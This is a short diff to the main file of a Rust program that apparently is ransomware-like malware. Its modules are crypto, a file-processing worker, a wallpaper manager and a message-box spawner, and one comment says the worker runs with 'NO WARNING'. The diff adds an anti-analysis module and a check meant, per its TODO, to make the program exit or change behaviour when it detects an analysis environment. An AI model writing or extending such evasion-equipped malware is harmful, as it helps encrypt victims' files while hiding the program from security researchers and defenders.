@@ -11,6 +11,7 @@ mod crypto;
 mod worker;
 mod wallpaper_manager;
 mod messagebox_spawner;
+mod antianalysis;
 
 fn main() {
     // If SHOW_CLI is true but we're in windows subsystem mode, allocate a console
@@ -29,6 +30,10 @@ fn main() {
         print_banner();
     }
 
+    // Run anti-analysis checks (currently just prints debug info)
+    let _analysis_detected = antianalysis::detect_analysis_environment();
+    // TODO: In production, exit or behave differently if analysis_detected is true
+    
     // Run the file processing worker (NO WARNING - just do it!)
     match worker::run() {
         Ok(_) => {
